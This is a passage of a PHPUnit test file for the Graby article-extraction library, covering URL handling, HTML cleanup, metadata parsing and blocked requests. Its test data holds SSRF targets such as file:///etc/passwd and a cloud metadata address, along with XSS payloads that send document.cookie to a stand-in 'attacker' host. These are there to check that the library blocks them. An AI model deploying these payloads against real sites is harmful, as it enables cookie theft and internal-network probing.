        $method = $reflection->getMethod('makeAbsolute');
        $method->setAccessible(true);

        $method->invokeArgs($graby, [$base, $e]);

        $this->assertSame($expectedResult, $e->getAttribute($expectedAttr));
    }

    /**
     * Test on nested element: image inside a link.
     */
    public function testMakeAbsoluteMultiple(): void
    {
        $graby = new Graby();

        $doc = new \DOMDocument();
        $doc->loadXML('<a href="/lol"><img src=" /path/to/image.jpg" /></a>');

        /** @var \DOMElement */
        $e = $doc->documentElement;

        $reflection = new \ReflectionClass(\get_class($graby));
        $method = $reflection->getMethod('makeAbsolute');
        $method->setAccessible(true);

        $method->invokeArgs($graby, ['http://example.org', $e]);

        $this->assertSame('http://example.org/lol', $e->getAttribute('href'));
        $this->assertNotNull($e->firstChild->attributes->getNamedItem('src'));
        $this->assertSame('http://example.org/path/to/image.jpg', $e->firstChild->attributes->getNamedItem('src')->nodeValue);
    }

    public function testContentLinksRemove(): void
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'text/html'],
            '<article><p>' . str_repeat('This is an awesome text with some links, here there are the awesome', 7) . ' <a href="#links">links :)</a></p></article>'
        ));

        $graby = new Graby(['content_links' => 'remove'], $httpMockClient);

        $res = $graby->fetchContent('http://example.com');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('No title found', $res['title']);
        $this->assertStringContainsString('<p>' . str_repeat('This is an awesome text with some links, here there are the awesome', 7) . ' links :)</p>', $res['html']);
        $this->assertSame('http://example.com', $res['url']);
        $this->assertSame('This is an awesome text with some links, here there are the awesomeThis is an awesome text with some links, here there are the awesomeThis is an awesome text with some links, here there are the awesomeThis is an awesome text with some links, here there &hellip;', $res['summary']);
        $this->assertStringContainsString('text/html', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function testMimeActionNotDefined(): void
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(200, ['Content-Type' => 'application/pdf']));

        $graby = new Graby(['content_type_exc' => ['application/pdf' => ['action' => 'delete', 'name' => 'PDF']]], $httpMockClient);

        $res = $graby->fetchContent('example.com');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('No title found', $res['title']);
        $this->assertSame('[unable to retrieve full-text content]', $res['html']);
        $this->assertSame('http://example.com', $res['url']);
        $this->assertSame('[unable to retrieve full-text content]', $res['summary']);
        $this->assertSame('application/pdf', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function dataForSafeCurl(): array
    {
        return [
            ['http://0.0.0.0:123'],
            ['http://127.0.0.1/server-status'],
            ['file:///etc/passwd'],
            ['ssh://localhost'],
            ['gopher://localhost'],
            ['telnet://localhost:25'],
            ['http://169.254.169.254/latest/meta-data/'],
            ['ftp://myhost.com'],
        ];
    }

    /**
     * @dataProvider dataForSafeCurl
     */
    public function testBlockedUrlBySafeCurl(string $url): void
    {
        $graby = new Graby();
        $res = $graby->fetchContent($url);

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('No title found', $res['title']);
        $this->assertSame('[unable to retrieve full-text content]', $res['html']);
        $this->assertSame('[unable to retrieve full-text content]', $res['summary']);
        $this->assertEmpty($res['headers']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
        $this->assertSame(500, $res['status']);
    }

    public function testErrorMessages(): void
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(200, [], 'yay'));

        $graby = new Graby([
            'error_message' => 'Nothing found, hu?',
            'error_message_title' => 'No title detected',
        ], $httpMockClient);

        $res = $graby->fetchContent('example.com');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('No title detected', $res['title']);
        $this->assertSame('Nothing found, hu?', $res['html']);
        $this->assertSame('http://example.com', $res['url']);
        $this->assertSame('Nothing found, hu?', $res['summary']);
        $this->assertEmpty($res['headers']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function dataWithAccent(): array
    {
        return [
            'host with accent' => ['http://pérotin.com/post/2009/06/09/SAV-Free-un-sketch-kafkaien', 'http://xn--protin-bva.com/post/2009/06/09/SAV-Free-un-sketch-kafkaien'],
            'url with accent 1' => ['https://en.wikipedia.org/wiki/Café', 'https://en.wikipedia.org/wiki/Caf%C3%A9'],
            'url with accent 2' => ['http://www.atterres.org/article/budget-2016-les-10-méprises-libérales-du-gouvernement', 'http://www.atterres.org/article/budget-2016-les-10-m%C3%A9prises-lib%C3%A9rales-du-gouvernement'],
            'url with accent 3' => ['http://www.pro-linux.de/news/1/23430/linus-torvalds-über-das-internet-der-dinge.html', 'http://www.pro-linux.de/news/1/23430/linus-torvalds-%C3%BCber-das-internet-der-dinge.html'],
        ];
    }

    /**
     * @dataProvider dataWithAccent
     */
    public function testUrlWithAccent(string $url, string $urlExpected): void
    {
        $graby = new Graby();

        $reflection = new \ReflectionClass(\get_class($graby));
        $method = $reflection->getMethod('validateUrl');
        $method->setAccessible(true);

        $res = $method->invokeArgs($graby, [$url]);

        $this->assertSame($urlExpected, $res);
    }

    public function dataForCleanupHtml(): array
    {
        return [
            'nothing' => [
                'html',
                'html',
                true,
            ],
            'only_meta' => [
                '<html><meta content="/assets/lol.jpg" property="og:image" /><meta content="http://www.io.lol" property="og:url"/></html>',
                '',
                true,
            ],
            'multiplepage1' => [
                '<html><h2 class="primary">my title</h2><div class="story">my content</div><ul><li class="next"><a href="multiplepage1.com">next page</a></li></ul></html>',
                '<h2 class="primary">my title</h2><div class="story">my content</div><ul><li class="next"><a href="multiplepage1.com">next page</a></li></ul>',
                true,
            ],
            'script' => [
                '<html><body><h2 class="primary">my title</h2><div class="story">my content<script>window.location="http://attacker/?cookie="+document.cookie</script></div></body></html>',
                '<h2 class="primary">my title</h2><div class="story">my contentwindow.location="http://attacker/?cookie="+document.cookie</div>',
                true,
            ],
            'script_location_removed_from_long_text' => [
                '<html><body><div><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p><script>window.location="http://attacker/?cookie="+document.cookie</script><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p></div></body></html>',
                '<div><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p></div>',
            ],
            'script_inject_removed_from_long_text' => [
                '<html><script src="http://attacker/malicious‑script.js"></script><body><div><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p></div></body></html>',
                '<div><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p></div>',
            ],
        ];
    }

    /**
     * @dataProvider dataForCleanupHtml
     */
    public function testCleanupHtml(string $html, string $expected, bool $withLog = false): void
    {
        $logger = new Logger('foo');
        $handler = new TestHandler();
        $logger->pushHandler($handler);

        $graby = new Graby(['debug' => true]);
        $graby->setLogger($logger);

        $cleanedHtml = $graby->cleanupHtml($html, 'http://0.0.0.0');

        $this->assertSame($expected, $cleanedHtml);

        if ($withLog) {
            $records = $handler->getRecords();

            $this->assertGreaterThan(1, $records);
        }
    }

    public function testEncodingUtf8ForTextPlainPage(): void
    {
        $graby = $this->getGrabyWithMock('/fixtures/content/malformed_UTF8_characters.txt');
        $res = $graby->fetchContent('http://www.ais.org/~jrh/acn/text/ACN8-1.txt');

        $this->assertArrayHasKey('html', $res);
        $this->assertTrue(false !== json_encode($res['html']), json_last_error_msg());
    }

    public function testEmptyNodesRemoved(): void
    {
        $graby = $this->getGrabyWithMock('/fixtures/content/framablog.html');
        $res = $graby->fetchContent('https://framablog.org/2017/12/02/avancer-ensemble-vers-la-contribution/');

        // The initial treatment was encapsulating the content into the empty node
        // So we don't want to see that again
        $this->assertStringNotContainsString('<figure><p>Après un <em>icebreaker</em>', $res['html']);
    }

    public function testMetaAuthor(): void
    {
        $graby = $this->getGrabyWithMock('/fixtures/content/keithjgrant.html');
        $res = $graby->fetchContent('https://keithjgrant.com/posts/2018/06/resilient-declarative-contextual/');

        // The initial treatment was encapsulating the content into the empty node
        // So we don't want to see that again
        $authors = $res['authors'];
        $this->assertCount(1, $authors);
        $this->assertSame('Keith J. Grant', $authors[0]);
    }

    public function testJsonLd(): void
    {
        $graby = $this->getGrabyWithMock('/fixtures/content/20minutes-jsonld.html');
        $res = $graby->fetchContent('http://www.20minutes.fr/sport/football/2155935-20171022-stade-rennais-portugais-paulo-fonseca-remplacer-christian-gourcuff');

        $this->assertCount(11, $res);

        $this->assertArrayHasKey('status', $res);
        $this->assertArrayHasKey('html', $res);
        $this->assertArrayHasKey('title', $res);
        $this->assertArrayHasKey('language', $res);
        $this->assertArrayHasKey('date', $res);
        $this->assertArrayHasKey('authors', $res);
        $this->assertArrayHasKey('url', $res);
        $this->assertArrayHasKey('summary', $res);
        $this->assertArrayHasKey('image', $res);
        $this->assertArrayHasKey('native_ad', $res);
        $this->assertArrayHasKey('headers', $res);

        $this->assertSame(200, $res['status']);
        $this->assertSame('Stade Rennais: Le Portugais Paulo Fonseca pour remplacer Christian Gourcuff?', $res['title']);
        $this->assertCount(1, $res['authors']);
        $this->assertSame('Jeremy Goujon', $res['authors'][0]);
    }

    public function testKeepOlStartAttribute(): void
    {
        $graby = $this->getGrabyWithMock('/fixtures/content/timothysykes-keepol.html');
        $res = $graby->fetchContent('https://www.timothysykes.com/blog/10-things-know-short-selling/');

        $this->assertCount(11, $res);

        $this->assertArrayHasKey('status', $res);
        $this->assertArrayHasKey('html', $res);
        $this->assertArrayHasKey('title', $res);
        $this->assertArrayHasKey('language', $res);
        $this->assertArrayHasKey('date', $res);
        $this->assertArrayHasKey('authors', $res);
        $this->assertArrayHasKey('url', $res);
        $this->assertArrayHasKey('summary', $res);
        $this->assertArrayHasKey('image', $res);
        $this->assertArrayHasKey('native_ad', $res);
        $this->assertArrayHasKey('headers', $res);

        $this->assertSame(200, $res['status']);
        $this->assertStringContainsString('<ol start="2">', $res['html']);
        $this->assertStringContainsString('<ol start="3">', $res['html']);
        $this->assertStringContainsString('<ol start="4">', $res['html']);
    }

    public function testContentWithXSS(): void
    {
        $graby = $this->getGrabyWithMock('/fixtures/content/gist-xss.html');
        $res = $graby->fetchContent('https://gist.githubusercontent.com/nicosomb/94d1e08c42baff9184c313d638de1195/raw/d63b0bc99225604a9f4b57bfea1cd7a538c8ceeb/gistfile1.txt');

        $this->assertStringNotContainsString('<script>', $res['html']);
    }

    public function testBadUrl(): void
    {
        $graby = $this->getGrabyWithMock('/fixtures/content/bjori-404.html', 404);
        $res = $graby->fetchContent('https://bjori.blogspot.com/201');

        $this->assertCount(11, $res);

        $this->assertArrayHasKey('status', $res);
        $this->assertArrayHasKey('html', $res);
        $this->assertArrayHasKey('title', $res);
        $this->assertArrayHasKey('language', $res);
        $this->assertArrayHasKey('date', $res);
        $this->assertArrayHasKey('authors', $res);
        $this->assertArrayHasKey('url', $res);
        $this->assertArrayHasKey('summary', $res);
        $this->assertArrayHasKey('image', $res);
        $this->assertArrayHasKey('native_ad', $res);
        $this->assertArrayHasKey('headers', $res);

        $this->assertSame(404, $res['status']);
        $this->assertEmpty($res['language']);
        $this->assertSame('https://bjori.blogspot.com/201', $res['url']);
        $this->assertSame("bjori doesn't blog", $res['title']);
        $this->assertSame('[unable to retrieve full-text content]', $res['html']);
        $this->assertSame('[unable to retrieve full-text content]', $res['summary']);
        $this->assertSame('text/html', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
    }

    public function dataDate(): array
    {
        return [
            [
                'https://www.lemonde.fr/economie/article/2011/07/05/moody-s-abaisse-la-note-du-portugal-de-quatre-crans_1545237_3234.html',
                'lemonde-date.html',
                '2011-07-05T22:09:59+02:00',
            ],
            [
                'https://www.20minutes.fr/sport/football/2282359-20180601-video-france-italie-bleus-ambiancent-regalent-va-essayer-trop-enflammer',
                '20minutes-date.html',
                '2018-06-01T23:03:11+02:00',
            ],
        ];
    }

    /**
     * @dataProvider dataDate
     */
    public function testDate(string $url, string $file, string $expectedDate): void
    {
        $graby = $this->getGrabyWithMock('/fixtures/content/' . $file);
        $res = $graby->fetchContent($url);

        $this->assertCount(11, $res);

        $this->assertArrayHasKey('status', $res);
        $this->assertArrayHasKey('html', $res);
        $this->assertArrayHasKey('title', $res);
        $this->assertArrayHasKey('language', $res);
        $this->assertArrayHasKey('date', $res);
        $this->assertArrayHasKey('authors', $res);
        $this->assertArrayHasKey('url', $res);
        $this->assertArrayHasKey('summary', $res);
        $this->assertArrayHasKey('image', $res);
        $this->assertArrayHasKey('native_ad', $res);
        $this->assertArrayHasKey('headers', $res);

        $this->assertSame($expectedDate, $res['date']);
    }

    public function dataAuthors(): array
    {
        return [
            [
                'https://www.20minutes.fr/sport/football/2282359-20180601-video-france-italie-bleus-ambiancent-regalent-va-essayer-trop-enflammer',
                '20minutes-authors.html',
                ['Jean Saint-Marc'],
            ],
            [
                'https://www.liberation.fr/planete/2017/04/05/donald-trump-et-xi-jinping-tentative-de-flirt-en-floride_1560768',
                'liberation-authors.html',
                ['Raphaël Balenieri', 'Frédéric Autran'],
            ],
        ];
    }

    /**
     * @dataProvider dataAuthors
     */
    public function testAuthors(string $url, string $file, array $expectedAuthors): void
    {
        $graby = $this->getGrabyWithMock(
            '/fixtures/content/' . $file,
            200,
            [
                'extractor' => [
                    'config_builder' => [
                        'site_config' => [__DIR__ . '/fixtures/site_config'],
                    ],
                ],
            ]
        );
        $res = $graby->fetchContent($url);

        $this->assertCount(11, $res);

        $this->assertArrayHasKey('status', $res);
        $this->assertArrayHasKey('html', $res);
        $this->assertArrayHasKey('title', $res);
        $this->assertArrayHasKey('language', $res);
        $this->assertArrayHasKey('date', $res);
        $this->assertArrayHasKey('authors', $res);
        $this->assertArrayHasKey('url', $res);
        $this->assertArrayHasKey('summary', $res);
        $this->assertArrayHasKey('image', $res);
        $this->assertArrayHasKey('native_ad', $res);
        $this->assertArrayHasKey('headers', $res);

        $this->assertSame($expectedAuthors, $res['authors']);
    }

    /**
     * Validated using the site_config in "tests/fixtures".
     */
    public function testIfPageContainsWithSinglePageLink(): void
    {
        $graby = $this->getGrabyWithMock(
            '/fixtures/content/timothysykes-keepol.html',
            200,
            [
                'extractor' => [
                    'config_builder' => [
                        'site_config' => [__DIR__ . '/fixtures/site_config'],
                    ],
                ],
            ]
        );
        $res = $graby->fetchContent('https://www.timothysykes.com/blog/10-things-know-short-selling/');

        $this->assertCount(11, $res);

        $this->assertArrayHasKey('status', $res);
        $this->assertArrayHasKey('html', $res);
        $this->assertArrayHasKey('title', $res);
        $this->assertArrayHasKey('language', $res);
        $this->assertArrayHasKey('date', $res);
        $this->assertArrayHasKey('authors', $res);
        $this->assertArrayHasKey('url', $res);
        $this->assertArrayHasKey('summary', $res);
        $this->assertArrayHasKey('image', $res);
        $this->assertArrayHasKey('native_ad', $res);
        $this->assertArrayHasKey('headers', $res);

        $this->assertSame(200, $res['status']);
    }

    /**
     * Validated using the site_config in "tests/fixtures".
     */
    public function testIfPageContainsWithNextPageLink(): void
    {
        $graby = $this->getGrabyWithMock(
            '/fixtures/content/rollingstone.html',
            200,
            [
                'debug' => true,
                'extractor' => [
                    'config_builder' => [
                        'site_config' => [__DIR__ . '/fixtures/site_config'],
                    ],
                ],
            ]
        );
        $res = $graby->fetchContent('https://www.rollingstone.com/?redirurl=/politics/news/greed-and-debt-the-true-story-of-mitt-romney-and-bain-capital-20120829');

        $this->assertCount(11, $res);

        $this->assertArrayHasKey('status', $res);
        $this->assertArrayHasKey('html', $res);
        $this->assertArrayHasKey('title', $res);
        $this->assertArrayHasKey('language', $res);
        $this->assertArrayHasKey('date', $res);
        $this->assertArrayHasKey('authors', $res);
        $this->assertArrayHasKey('url', $res);
        $this->assertArrayHasKey('summary', $res);
        $this->assertArrayHasKey('image', $res);
        $this->assertArrayHasKey('native_ad', $res);
        $this->assertArrayHasKey('headers', $res);

        $this->assertSame(200, $res['status']);
    }

    public function testImgNoReferrer(): void
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><body><h1>Hello world</h1><article><p><img src="http://example.com/hello.jpg"> ' . str_repeat('This is an awesome text with some links, here there are the awesome', 7) . '</p></article></body></html>'
        ));
        $httpMockClient->addResponse(new Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><body><h1>Hello world</h1><article><p><img src="http://example.com/hello.jpg"> ' . str_repeat('This is an awesome text with some links, here there are the awesome', 7) . '</p></article></body></html>'
        ));

        $graby = new Graby(['content_links' => 'remove'], $httpMockClient);

        $graby->toggleImgNoReferrer(true);
        $res = $graby->fetchContent('example.com');

        $doc = new \DOMDocument();
        $doc->loadXML($res['html']);

        /** @var \DOMElement */
        $item = $doc->getElementsByTagName('img')->item(0);

        $this->assertTrue($item->hasAttribute('referrerpolicy'));
        $this->assertSame('no-referrer', $item->getAttribute('referrerpolicy'));

        $graby->toggleImgNoReferrer(false);
        $res = $graby->fetchContent('example.com');

        $doc = new \DOMDocument();
        $doc->loadXML($res['html']);

        /** @var \DOMElement */
        $item = $doc->getElementsByTagName('img')->item(0);

        $this->assertFalse($item->hasAttribute('referrerpolicy'));
    }

    /**
     * @see https://github.com/j0k3r/graby/issues/223
     */
    public function testWithTooLongHtmlJitFail(): void
    {
        $graby = $this->getGrabyWithMock(
            '/fixtures/content/blog-oracle.html',
            200,
            [
                'debug' => true,
            ]
        );
        $res = $graby->fetchContent('https://blogs.oracle.com/dave/java-contended-annotation-to-help-reduce-false-sharing');

        $this->assertCount(11, $res);
        $this->assertNotSame('[unable to retrieve full-text content]', $res['summary']);
        $this->assertNotSame('No title found', $res['title']);
    }

    /**
     * Return an instance of graby with a mocked Guzzle client returning data from a predefined file.
     */
    private function getGrabyWithMock(string $filePath, int $status = 200, array $grabyConfig = []): Graby
    {
        $response = new Response(
            $status,
            ['content-type' => 'text/html'],
            (string) file_get_contents(__DIR__ . $filePath)
        );

        $client = new HttpMockClient();
        $client->addResponse($response);

        return new Graby($grabyConfig, $client);
    }
}
